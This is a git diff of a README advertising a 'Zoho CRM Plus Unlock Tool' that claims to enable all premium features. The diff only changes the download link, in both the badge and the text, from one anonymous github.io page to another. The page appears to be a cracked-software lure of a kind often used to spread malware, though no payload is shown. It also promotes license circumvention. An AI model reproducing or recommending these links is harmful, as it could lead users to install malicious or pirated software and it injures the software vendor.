@@ -6,7 +6,7 @@
 <h1 align="center">⚡ Zoho CRM Plus Unlock Tool</h1>
 
 <p align="center">
-  <a href="https://hiopal3847.github.io/.github/323" target="_blank">
+  <a href="https://zohocrmplusload.github.io/.github/" target="_blank">
     <img src="https://img.shields.io/badge/Download%20Zoho%20CRM%20Plus%20Unlock%20Tool-Enable%20All%20Features-009933?style=for-the-badge&logo=zoho&logoColor=white" 
          alt="Download Zoho CRM Plus Unlock Tool" style="width: 540px; height: 37px;">
   </a>
@@ -97,7 +97,7 @@ Have questions or want to contribute? Open an issue or submit a pull request.
 ## ⭐ Unlock Zoho CRM Plus – Comprehensive Customer Relationship Management
 
 Unlock all premium features of Zoho CRM Plus.  
-[Download the Unlock Tool](https://hiopal3847.github.io/.github/323) and supercharge your sales and marketing efforts.
+[Download the Unlock Tool](https://zohocrmplusload.github.io/.github/) and supercharge your sales and marketing efforts.
 
 ---
 
